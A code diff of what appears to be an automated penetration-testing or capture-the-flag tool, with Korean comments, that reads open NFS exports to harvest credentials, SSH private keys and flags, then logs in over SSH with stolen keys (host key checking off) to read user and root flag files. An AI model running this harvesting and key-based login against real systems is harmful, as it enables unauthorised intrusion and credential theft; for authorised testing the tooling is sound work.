@@ -233,9 +233,13 @@ class Orchestrator(FootholdMixin):
                  poc_dir: str = "",
                  fetch_pocs: bool = False,
                  judge: bool = False,
+                 priv_env: bool = False,
                  workspace=None):
         self.guard = guard
         self.runner = runner
+        # [env-auto] 권한(root/sudo) 로컬 환경조작 옵트인 — sudo NFS 마운트·/etc/hosts 쓰기.
+        # 기본 OFF(—full-auto 에 포함 안 함). rootless(libnfs·Host헤더)로 안 되는 경우의 폴백 전용.
+        self.priv_env = priv_env
         self.kb = kb
         self.approver = approver
         self.hosts_map = hosts_map
@@ -2340,9 +2344,10 @@ class Orchestrator(FootholdMixin):
                 return
         except OSError:
             pass
-        # [env-auto] 쓰기 권한 없음(비root 실행) → 옵트인 하에서 sudo -n(비대화형)로 자동 추가 시도.
-        # 캐시된 sudo 타임스탬프가 있으면 성공, 없으면 rc!=0 → 조용히 실패 대신 1회 수동 안내.
-        if (self.exploit_exec or self.auto_poc) and hosts_path == "/etc/hosts":
+        # [env-auto] 쓰기 권한 없음(비root 실행) → '--priv-env' 명시 옵트인일 때만 sudo -n(비대화형)
+        # 로 자동 추가(권한 작업은 전용 플래그 뒤로). 기본은 Host 헤더 기반 hosts_map 으로 이미
+        # 웹 경로가 동작하므로, sudo 없이도 핵심 자동화는 유지된다. 실패 시 1회 수동 안내.
+        if getattr(self, "priv_env", False) and hosts_path == "/etc/hosts":
             sudo_fn = getattr(self, "_hosts_sudo_fn", None)
             try:
                 if sudo_fn is not None:
@@ -2364,17 +2369,20 @@ class Orchestrator(FootholdMixin):
             report.manual_suggestions.append(hint)
 
     def _nfs_harvest_stage(self, report: OrchestrationReport, host) -> None:
-        """[env-auto] 열린 NFS export 를 '읽기전용' 마운트해 자격·SSH 키·플래그를 수확한다.
+        """[env-auto] 열린 NFS export 를 읽어 자격·SSH 키·플래그를 수확한다(옵트인·타겟 IP 한정).
 
-        옵트인(exploit_exec/auto_poc) + 타겟 IP 한정 + ro,nolock + 작업 후 umount. 실제
-        mount(root)는 sudo -n(주입 가능 `_nfs_mount_fn`), 권한 없으면 1회 수동 안내로 폴백
-        (무확인 강제 아님). 마운트 트리에서는 아무 것도 '실행'하지 않는다(정적 읽기 only).
-        수확한 자격/키/사용자는 world·후속 SSH 키 로그인으로 이어진다. 인가 대상 전용."""
+        안전·자동화 우선순위:
+          (1) **rootless 기본**: libnfs(`nfs-ls`/`nfs-cp`)로 **sudo·마운트 없이** 읽는다 — root 도
+              시스템 변경도 없어 --full-auto 만으로 완전 자동이면서 가장 안전하다.
+          (2) libnfs 미설치 + **`--priv-env` 명시 옵트인** 일 때만 `sudo -n` ro 마운트→스캔→umount
+              로 폴백(권한 작업은 전용 플래그 뒤로 — 기본 --full-auto 는 root 작업 안 함).
+          (3) 둘 다 불가면 1회 수동 안내(무확인 강제 아님).
+        수확한 자격/키/사용자는 world·후속 SSH 키 로그인으로 이어진다. 원격·마운트 트리에서 아무
+        것도 '실행'하지 않는다(정적 읽기 only). 인가 대상 전용."""
         if self.world is None or self.dry_run or not (self.exploit_exec or self.auto_poc):
             return
-        # NFS 신호(111/2049)가 전혀 없으면 생략(showmount 낭비 방지)
         if host is not None and host.open_ports and not ({111, 2049} & set(host.open_ports)):
-            return
+            return   # NFS 신호(111/2049) 없으면 생략
         import os
         import shutil
         import tempfile
@@ -2383,7 +2391,6 @@ class Orchestrator(FootholdMixin):
         from . import provenance as _prov
         from .flag import FlagHit
         ip = str(self.guard.bound_target or self.world.target)
-        # export 목록: 이미 돌린 showmount 원본 우선, 없으면 직접 1회 실행
         exports: list[str] = []
         for f in report.enum_findings:
             if "showmount" in (f.command or ""):
@@ -2395,50 +2402,16 @@ class Orchestrator(FootholdMixin):
             exports = nfs_recon.parse_exports(getattr(out, "stdout", "") or "")
         if not exports:
             return
-        mounter = getattr(self, "_nfs_mount_fn", None) or nfs_recon.sudo_mount
-        umounter = getattr(self, "_nfs_umount_fn", None) or nfs_recon.sudo_umount
+        if getattr(self, "_nfs_keystore", None) is None:
+            self._nfs_keystore = tempfile.mkdtemp(prefix="assassin_nfskeys_")
+        run_fn = getattr(self, "_nfs_run_fn", None) or nfs_recon._run
+        rootless = getattr(self, "_nfs_force_libnfs", None)
+        if rootless is None:
+            rootless = self.is_tool_available("nfs-ls")
         harvested_keys: list[str] = []
         harvested_users: list[str] = []
-        for export in exports[:5]:
-            mp = tempfile.mkdtemp(prefix="assassin_nfs_")
-            ok, err = False, ""
-            for vers in ("3", "4"):
-                try:
-                    ok, err = mounter(ip, export, mp, vers=vers)
-                except TypeError:
-                    ok, err = mounter(ip, export, mp)   # 2/3-인자 테스트 mounter 호환
-                if ok:
-                    break
-            if not ok:
-                self.audit.event("nfs_mount_failed", export=export, error=str(err)[:200])
-                hint = nfs_recon.manual_hint(ip, export)
-                if hint not in report.manual_suggestions:
-                    report.manual_suggestions.append(hint)
-                try:
-                    os.rmdir(mp)
-                except OSError:
-                    pass
-                continue
-            self.audit.event("nfs_mounted", export=export, mountpoint=mp)
-            try:
-                fnd = nfs_recon.scan_tree(mp, export=export, flag_kind=self.flag_kind)
-                # SSH 키는 umount 전에 '보존 복사'(언마운트하면 사라짐) — 0600 로컬 저장
-                if fnd.ssh_keys and getattr(self, "_nfs_keystore", None) is None:
-                    self._nfs_keystore = tempfile.mkdtemp(prefix="assassin_nfskeys_")
-                for k in fnd.ssh_keys:
-                    dest = os.path.join(self._nfs_keystore, f"key_{len(harvested_keys)}")
-                    try:
-                        shutil.copyfile(k, dest)
-                        os.chmod(dest, 0o600)
-                        harvested_keys.append(dest)
-                    except OSError:
-                        pass
-            finally:
-                umounter(mp)
-                try:
-                    os.rmdir(mp)
-                except OSError:
-                    pass
+
+        def _reflect(fnd, export):   # 공통: 수확 결과를 world/플래그/안내로 반영
             for u, p in fnd.creds:
                 self.world.add_cred(f"{u}:{p}", source=f"NFS {export}")
             for u in fnd.users:
@@ -2446,14 +2419,79 @@ class Orchestrator(FootholdMixin):
                     harvested_users.append(u)
             for kind, val in fnd.flags:
                 prov = _prov.FlagProvenance(kind, val, f"<NFS {export}>", "access",
-                                            "nfs-export", f"NFS export {export} 파일에서 직접 읽음")
+                                            "exploit-derived", f"NFS export {export} 에서 직접 읽음")
                 self._record_flag(report, FlagHit(val, kind, "NFS"), prov)
+            for k in fnd.ssh_keys:
+                if k not in harvested_keys:
+                    harvested_keys.append(k)
             if fnd.creds or fnd.ssh_keys or fnd.flags:
-                self.audit.event("nfs_harvest", export=export, creds=len(fnd.creds),
-                                 keys=len(fnd.ssh_keys), flags=len(fnd.flags))
+                self.audit.event("nfs_harvest", export=export, via=("libnfs" if rootless else "mount"),
+                                 creds=len(fnd.creds), keys=len(fnd.ssh_keys), flags=len(fnd.flags))
                 report.manual_suggestions.append(
                     f"# NFS export {export} 수확 — 자격 {len(fnd.creds)} · SSH키 {len(fnd.ssh_keys)} · "
                     f"플래그 {len(fnd.flags)} · 주목 파일: {', '.join(fnd.notable[:6]) or '없음'}")
+
+        for export in exports[:5]:
+            # (1) rootless(libnfs) 우선 — sudo·마운트 없음
+            if rootless:
+                fnd, ok = nfs_recon.scan_via_libnfs(ip, export, run_fn, self._nfs_keystore,
+                                                    flag_kind=self.flag_kind)
+                if ok:
+                    self.audit.event("nfs_read", export=export, via="libnfs")
+                    _reflect(fnd, export)
+                    continue
+                # libnfs 목록 실패 → 아래 폴백으로
+            # (2) sudo 마운트 폴백 — '--priv-env' 명시 옵트인일 때만(권한 작업 전용 플래그)
+            if getattr(self, "priv_env", False):
+                mounter = getattr(self, "_nfs_mount_fn", None) or nfs_recon.sudo_mount
+                umounter = getattr(self, "_nfs_umount_fn", None) or nfs_recon.sudo_umount
+                mp = tempfile.mkdtemp(prefix="assassin_nfs_")
+                ok, err = False, ""
+                for vers in ("3", "4"):
+                    try:
+                        ok, err = mounter(ip, export, mp, vers=vers)
+                    except TypeError:
+                        ok, err = mounter(ip, export, mp)
+                    if ok:
+                        break
+                if not ok:
+                    self.audit.event("nfs_mount_failed", export=export, error=str(err)[:200])
+                    hint = nfs_recon.manual_hint(ip, export)
+                    if hint not in report.manual_suggestions:
+                        report.manual_suggestions.append(hint)
+                    try:
+                        os.rmdir(mp)
+                    except OSError:
+                        pass
+                    continue
+                self.audit.event("nfs_mounted", export=export, mountpoint=mp)
+                try:
+                    fnd = nfs_recon.scan_tree(mp, export=export, flag_kind=self.flag_kind)
+                    persisted: list[str] = []
+                    for k in fnd.ssh_keys:   # umount 전 0600 보존 복사(키 경로는 마운트 내부)
+                        dest = os.path.join(self._nfs_keystore, f"key_m{len(harvested_keys) + len(persisted)}")
+                        try:
+                            shutil.copyfile(k, dest)
+                            os.chmod(dest, 0o600)
+                            persisted.append(dest)
+                        except OSError:
+                            pass
+                    fnd.ssh_keys = persisted
+                finally:
+                    umounter(mp)
+                    try:
+                        os.rmdir(mp)
+                    except OSError:
+                        pass
+                _reflect(fnd, export)
+                continue
+            # (3) rootless 불가 + --priv-env 아님 → 수동 안내(설치 또는 전용 플래그)
+            hint = ("NFS export 자동 수확 보류 — rootless 도구 설치 권장(완전 자동): "
+                    "sudo apt install -y libnfs-utils  (또는 sudo 마운트 허용: --priv-env). "
+                    f"수동: {nfs_recon.manual_hint(ip, export)}")
+            if hint not in report.manual_suggestions:
+                report.manual_suggestions.append(hint)
+            self.audit.event("nfs_skip", export=export, reason="no_libnfs_no_privenv")
         # 수확한 SSH 키로 로그인해 플래그 읽기(타겟 22 열림 시·opt-in)
         if harvested_keys and (host is None or not host.open_ports or 22 in host.open_ports):
             self._try_ssh_keys(report, harvested_keys, harvested_users)
@@ -2467,9 +2505,10 @@ class Orchestrator(FootholdMixin):
             report.manual_suggestions.append(
                 "# SSH 키 수확됨 — 'ssh -i <키> <user>@<타겟>' 으로 로그인·플래그 읽기 권장(ssh 미설치)")
             return
+        import re as _re
+
         from . import provenance as _prov
-        from .flag import FlagHit
-        from .flag import scan as _scan
+        from .flag import FlagHit, extract_flags
         target = str(self.guard.bound_host or self.guard.bound_target or self.world.target)
         cand: list[str] = []
         for u in [*users, "root", "admin"]:
@@ -2481,26 +2520,31 @@ class Orchestrator(FootholdMixin):
                 if tries >= 8 or self._goal_reached(report) or self._time_up():
                     return
                 tries += 1
+                # user.txt/root.txt 를 '라벨'로 분리 출력 → 종류(user/root)를 명확히 기록(혼동 방지).
                 cmd = (f"ssh -i {shlex.quote(key)} -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
                        f"-o PreferredAuthentications=publickey -o PasswordAuthentication=no "
                        f"-o BatchMode=yes {shlex.quote(user)}@{target} "
-                       f"'id; cat ~/user.txt 2>/dev/null; cat /home/*/user.txt 2>/dev/null; "
-                       f"cat /root/root.txt 2>/dev/null'")
+                       f"'id; echo USERTXT:$(cat ~/user.txt 2>/dev/null || cat /home/*/user.txt 2>/dev/null); "
+                       f"echo ROOTTXT:$(cat /root/root.txt 2>/dev/null)'")
                 before = len(report.enum_findings)
                 self._attempt(report, report.enum_findings, cmd, phase="access")
                 if len(report.enum_findings) <= before:
                     continue
                 raw = (getattr(report.enum_findings[before], "raw_output", "")
                        or report.enum_findings[before].output or "")
-                if "uid=" in raw:
-                    self.world.add_cred(f"{user}:<ssh-key:{os.path.basename(key)}>", source="NFS SSH키")
-                    self.audit.event("nfs_ssh_key_login", user=user, key=os.path.basename(key))
-                    for hit in _scan(cmd, raw, flag_kind=self.flag_kind):
-                        prov = _prov.FlagProvenance(hit.kind, hit.value, "<SSH 키 로그인 직독>",
-                                                    "access", "nfs-ssh-key",
-                                                    f"{user} SSH 키 로그인 후 직접 읽음")
-                        self._record_flag(report, FlagHit(hit.value, hit.kind, "SSH키"), prov)
-                    return   # 로그인 성공 — 더 시도하지 않음
+                if "uid=" not in raw:
+                    continue
+                self.world.add_cred(f"{user}:<ssh-key:{os.path.basename(key)}>", source="NFS SSH키")
+                self.audit.event("nfs_ssh_key_login", user=user, key=os.path.basename(key))
+                for kind, label in (("user", "USERTXT:"), ("root", "ROOTTXT:")):
+                    m = _re.search(rf"{label}(.*)", raw)
+                    if not m:
+                        continue
+                    for val in extract_flags(m.group(1)):
+                        prov = _prov.FlagProvenance(kind, val, "<SSH 키 로그인 직독>", "access",
+                                                    "exploit-derived", f"{user} SSH 키 로그인 후 직접 읽음")
+                        self._record_flag(report, FlagHit(val, kind, "SSH키"), prov)
+                return   # 로그인 성공 — 더 시도하지 않음
 
     def _classify_flag(self, report: OrchestrationReport, hit, cmd: str, phase: str):
         # [S4-3(2)] 로직은 flag_assess.classify_flag 로 분리 — self.workspace/self.kb 를
